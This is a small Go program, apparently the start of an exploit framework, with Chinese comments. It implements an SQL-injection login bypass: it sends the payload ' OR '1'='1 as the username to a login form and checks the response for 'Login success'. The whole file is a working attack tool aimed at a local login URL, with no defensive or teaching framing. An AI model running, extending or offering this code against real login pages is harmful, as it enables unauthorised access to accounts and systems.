package doc

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"
)

type Exploit interface {
	Name() string
	Run(target Target) (*Result, error)
}

// 攻击目标
type Target struct {
	URL string
}

// 利用结果
type Result struct {
	Success  bool
	Response string
}

// SQL 注入实现
type SQLiExploit struct {
	Payload string
	Client  *http.Client
}

func (e *SQLiExploit) Name() string {
	return "SQL Injection Auth Bypass"
}

func (e *SQLiExploit) Run(target Target) (*Result, error) {
	data := url.Values{}
	data.Set("username", e.Payload)
	data.Set("password", "test")

	resp, err := e.Client.PostForm(target.URL, data)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	result := &Result{
		Response: string(body),
	}

	// 简单判断是否成功（可扩展为规则引擎）
	if containsSuccess(string(body)) {
		result.Success = true
	}

	return result, nil
}

func containsSuccess(resp string) bool {
	return contains(resp, "Login success")
}

// 简单字符串匹配（避免引入 strings 包，方便扩展为规则引擎）
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (len(substr) == 0 || indexOf(s, substr) >= 0)
}

func indexOf(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func main() {
	target := Target{
		URL: "http://localhost:8080/login",
	}

	exploit := &SQLiExploit{
		Payload: "' OR '1'='1",
		Client: &http.Client{
			Timeout: 5 * time.Second,
		},
	}

	fmt.Println("Running exploit:", exploit.Name())

	result, err := exploit.Run(target)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Println("Success:", result.Success)
	fmt.Println("Response:", result.Response)
}
